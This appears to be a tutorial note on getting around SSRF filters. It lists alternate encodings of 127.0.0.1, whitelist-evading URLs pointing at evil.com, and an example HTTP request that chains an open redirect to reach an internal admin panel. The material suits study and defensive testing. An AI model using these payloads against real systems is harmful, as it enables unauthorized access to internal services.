# 04. Circumventing common SSRF defenses

## 🛡️ SSRF Filtering Techniques and Bypasses

It's common for applications to implement SSRF functionality along with defenses intended to **block malicious behavior**. However, these **defenses can often be bypassed** with creative techniques.

---

### 🚫 SSRF with Blacklist-Based Input Filters

Some applications block inputs like:

- `127.0.0.1`
- `localhost`
- `/admin`

But these blocks can be **circumvented** using:

---

### 🧩 Bypass Techniques

1. **Alternative IP representations** of `127.0.0.1`:
    - Decimal: `2130706433`
    - Octal: `017700000001`
    - Shortened: `127.1`
2. **Custom DNS that resolves to localhost**:
    - Example: `spoofed.burpcollaborator.net`
3. **Obfuscate using URL encoding or case variation**:
    - `/admin` → `%2fadmin` or `/AdMiN`
4. **Use redirection to target**:
    - Controlled URL redirects to internal service
    - Example: HTTP → HTTPS in redirection to bypass filtering

---

### ✅ SSRF with Whitelist-Based Input Filters

Applications may only allow URLs from **specific whitelisted domains**.

---

### ⚙️ Whitelist Bypass Techniques

1. **Embed credentials with `@` symbol**:
    
    ```
    https://whitelisted.com:fakepass@evil.com
    ```
    
2. **Use fragment identifiers `#`**:
    
    ```
    https://evil.com#whitelisted.com
    ```
    
3. **Use subdomain tricks**:
    
    ```
    https://whitelisted.com.evil.com
    ```
    
4. **URL-encode characters**:
    - Encode: `/admin` → `%2fadmin`
    - Double encode: `%252fadmin`
5. **Combine techniques for layered evasion**

---

### 🔁 Bypassing Filters via Open Redirection

Sometimes SSRF filters can be bypassed by exploiting an **open redirect** vulnerability in a trusted domain.

---

### 🧪 Example

Imagine the following redirect chain:

```
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```

This redirects to:

```
http://evil-user.net
```

You can exploit SSRF like so:

```
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

- ✅ This bypasses SSRF filtering because:
    - The domain `weliketoshop.net` is allowed
    - It **redirects internally** to the admin panel
    - The **SSRF occurs after the redirection**

---

### 💡 Summary

| 🔍 Filter Type | 🧨 Bypass Technique |
| --- | --- |
| **Blacklist** | Alt IPs, DNS tricks, encoding, redirects |
| **Whitelist** | URL parsing inconsistencies, subdomains, credentials, encoding |
| **Redirection** | Open redirect to internal URL on a whitelisted domain |